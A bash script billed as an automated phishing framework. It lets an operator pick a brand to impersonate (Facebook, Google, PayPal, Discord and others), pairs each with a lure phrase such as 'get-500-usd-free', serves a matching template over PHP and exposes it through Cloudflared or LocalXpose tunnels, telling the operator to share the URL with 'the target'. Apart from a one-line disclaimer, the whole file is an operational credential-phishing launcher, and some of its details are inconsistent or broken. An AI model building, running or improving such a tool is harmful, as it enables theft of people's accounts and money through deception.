#!/bin/bash

##   R777        :   Automated Phishing Framework
##   Author      :   [YOUR NAME]
##   Version     :   1.0.0
##   Github      :   https://github.com/[YOUR_USERNAME]/R777

# ---- Vibrant Color Palette ----
C0='\033[0m'
B1='\033[1m'
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
Yellow='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
BRed='\033[1;31m'
BGreen='\033[1;32m'
BYellow='\033[1;33m'
BBlue='\033[1;34m'
BPurple='\033[1;35m'
BCyan='\033[1;36m'
BWhite='\033[1;37m'

# Theme
P="$BCyan"
S="$BPurple"
A="$BGreen"
D="$BRed"
W="$BYellow"
I="$BBlue"
T="$White"
F="$BPurple"
H="$BWhite"

# ---- Banner ----
banner() {
    clear
    echo -e "${BRed}"
    echo "  ██████╗ ███████╗███████╗███████╗"
    echo "  ██╔══██╗██╔════╝██╔════╝██╔════╝"
    echo "  ██████╔╝█████╗  █████╗  █████╗  "
    echo "  ██╔══██╗██╔══╝  ██╔══╝  ██╔══╝  "
    echo "  ██║  ██║███████╗██║     ██║     "
    echo "  ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝     "
    echo -e "${BCyan}  ╔═══════════════════════════════╗"
    echo -e "  ║  ${BWhite}Automated Phishing Framework${BCyan}  ║"
    echo -e "  ║  ${BWhite}         Version 1.0.0         ${BCyan}║"
    echo -e "  ╚═══════════════════════════════╝${C0}"
    echo
}

# ---- Separator ----
separator() {
    echo -e "${F}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C0}"
}

# ---- Messages ----
info() { echo -e "${I} [ℹ]${C0} $1"; }
success() { echo -e "${A} [✓]${C0} $1"; }
warning() { echo -e "${W} [⚠]${C0} $1"; }
error() { echo -e "${D} [✗]${C0} $1"; }

# ---- Dependency Check ----
check_deps() {
    local deps=("php" "curl" "git" "wget" "unzip")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            warning "Installing $dep..."
            apt install -y "$dep" &>/dev/null || pkg install -y "$dep" &>/dev/null
        fi
    done
    success "All dependencies installed"
}

# ---- Main Menu ----
main_menu() {
    while true; do
        clear
        banner
        separator
        echo -e "${P}   🎯 Select Attack Vector${C0}"
        separator
        echo
        echo -e "  ${F}[${H}01${F}]${C0} ${T}Facebook"
        echo -e "  ${F}[${H}02${F}]${C0} ${T}Instagram"
        echo -e "  ${F}[${H}03${F}]${C0} ${T}Google"
        echo -e "  ${F}[${H}04${F}]${C0} ${T}Microsoft"
        echo -e "  ${F}[${H}05${F}]${C0} ${T}Netflix"
        echo -e "  ${F}[${H}06${F}]${C0} ${T}Twitter"
        echo -e "  ${F}[${H}07${F}]${C0} ${T}Snapchat"
        echo -e "  ${F}[${H}08${F}]${C0} ${T}Discord"
        echo -e "  ${F}[${H}09${F}]${C0} ${T}GitHub"
        echo -e "  ${F}[${H}10${F}]${C0} ${T}PayPal"
        echo
        echo -e "  ${F}[${H}99${F}]${C0} ${I}About"
        echo -e "  ${F}[${H}00${F}]${C0} ${D}Exit"
        echo
        separator
        read -p "$(echo -e ${P}" ┌─[${H}Select Option${P}]\n └──► "${C0})" opt

        case $opt in
            1|01) tunnel_menu "facebook" "https://free-fb-account";;
            2|02) tunnel_menu "instagram" "https://free-instagram-followers";;
            3|03) tunnel_menu "google" "https://free-cloud-storage";;
            4|04) tunnel_menu "microsoft" "https://onedrive-unlimited";;
            5|05) tunnel_menu "netflix" "https://netflix-free-upgrade";;
            6|06) tunnel_menu "twitter" "https://get-verified-badge";;
            7|07) tunnel_menu "snapchat" "https://view-snapchat-private";;
            8|08) tunnel_menu "discord" "https://discord-nitro-free";;
            9|09) tunnel_menu "github" "https://github-pro-free";;
            10) tunnel_menu "paypal" "https://get-500-usd-free";;
            99) about;;
            0|00) echo; echo -e "${D} Goodbye!${C0}"; exit 0;;
            *) error "Invalid option"; sleep 1;;
        esac
    done
}

# ---- Tunnel Menu ----
tunnel_menu() {
    local site="$1"
    local mask="$2"
    clear
    banner
    echo -e "${P}   🌐 Select Tunnel${C0}"
    separator
    echo
    echo -e "  ${F}[${H}1${F}]${C0} ${T}Localhost"
    echo -e "  ${F}[${H}2${F}]${C0} ${T}Cloudflared"
    echo -e "  ${F}[${H}3${F}]${C0} ${T}LocalXpose"
    echo -e "  ${F}[${H}0${F}]${C0} ${D}Back"
    echo
    separator
    read -p "$(echo -e ${P}" ┌─[${H}Select Tunnel${P}]\n └──► "${C0})" t_opt

    case $t_opt in
        1) start_localhost "$site";;
        2) start_cloudflared "$site";;
        3) start_localxpose "$site";;
        0) return;;
        *) error "Invalid"; sleep 1;;
    esac
}

# ---- Start Localhost ----
start_localhost() {
    local site="$1"
    local port=8080
    echo
    info "Starting PHP server on port $port..."
    cd "sites/$site" 2>/dev/null || { error "Template not found!"; return; }
    php -S 0.0.0.0:$port &>/dev/null &
    local pid=$!
    cd - &>/dev/null
    echo
    success "Server running at: ${H}http://localhost:$port${C0}"
    info "Press ${H}Ctrl+C${C0} to stop"
    wait $pid
}

# ---- Start Cloudflared ----
start_cloudflared() {
    local site="$1"
    local port=8080
    
    if ! command -v cloudflared &>/dev/null; then
        warning "Installing Cloudflared..."
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
        chmod +x /usr/local/bin/cloudflared
    fi
    
    echo
    info "Starting PHP server..."
    cd "sites/$site" 2>/dev/null || { error "Template not found!"; return; }
    php -S 0.0.0.0:$port &>/dev/null &
    local php_pid=$!
    cd - &>/dev/null
    
    info "Starting Cloudflared tunnel..."
    cloudflared tunnel --url http://localhost:$port --no-autoupdate 2>&1 | grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' &
    sleep 5
    
    echo
    success "Share this URL with the target!"
    wait $php_pid
}

# ---- Start LocalXpose ----
start_localxpose() {
    local site="$1"
    local port=8080
    
    if ! command -v localxpose &>/dev/null; then
        warning "Installing LocalXpose..."
        wget -q https://localxpose.io/linux/loclx -O /usr/local/bin/loclx
        chmod +x /usr/local/bin/loclx
    fi
    
    echo
    info "Starting PHP server..."
    cd "sites/$site" 2>/dev/null || { error "Template not found!"; return; }
    php -S 0.0.0.0:$port &>/dev/null &
    local php_pid=$!
    cd - &>/dev/null
    
    info "Starting LocalXpose tunnel..."
    loclx tunnel --http-to localhost:$port &
    sleep 5
    
    echo
    success "LocalXpose tunnel started on port $port"
    wait $php_pid
}

# ---- About ----
about() {
    clear
    banner
    separator
    echo -e "${P}   R777 - Automated Phishing Framework${C0}"
    separator
    echo
    echo -e "  ${T}Version: 1.0.0"
    echo -e "  ${T}Author:  [YOUR NAME]"
    echo -e "  ${T}Purpose: Authorized security testing only"
    echo
    echo -e "  ${W}⚠ DISCLAIMER:${C0}"
    echo -e "  ${T}For educational and authorized testing purposes only."
    echo
    separator
    read -p "$(echo -e ${P}" Press Enter to return...${C0}")"
}

# ============ MAIN ============
trap 'echo; echo -e "${D} Interrupted${C0}"; exit 0' SIGINT
check_deps
main_menu
